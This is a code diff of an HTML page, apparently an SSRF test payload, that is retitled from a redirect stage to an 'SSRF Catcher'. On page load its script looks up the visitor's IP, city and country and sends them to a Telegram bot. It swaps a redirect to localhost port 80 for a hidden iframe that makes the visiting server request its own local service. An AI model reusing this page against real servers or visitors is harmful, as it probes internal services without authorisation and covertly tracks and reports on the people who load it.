@@ -1,9 +1,8 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Redirect Stage</title>
+  <title>SSRF Catcher</title>
   <script>
     async function getIPInfo() {
       try {
@@ -26,8 +25,8 @@
     }
 
     function formatMessage(data) {
-      return `📄 *[REDIRECT STAGE]*
-🚪 *Redirecting to:* http://127.0.0.1:80
+      return `📄 *[SSRF CATCHER]*
+🌟 *SSRF Confirmed!* Server followed localhost redirect.
 🌐 *IP:* ${data.ip || "Unknown"}
 📍 *City:* ${data.city || "Unknown"}
 🌎 *Country:* ${data.country || "Unknown"}
@@ -40,13 +39,14 @@
       const ipData = await getIPInfo();
       const msg = formatMessage(ipData);
       await sendToTelegram(msg);
-      window.location.href = "http://127.0.0.1:80";
     }
 
     window.onload = run;
   </script>
 </head>
 <body>
-  <h1>Redirecting...</h1>
+  <h1>SSRF Check Complete.</h1>
+
+  <iframe src="http://127.0.0.1:80" style="display:none;"></iframe>
 </body>
 </html>
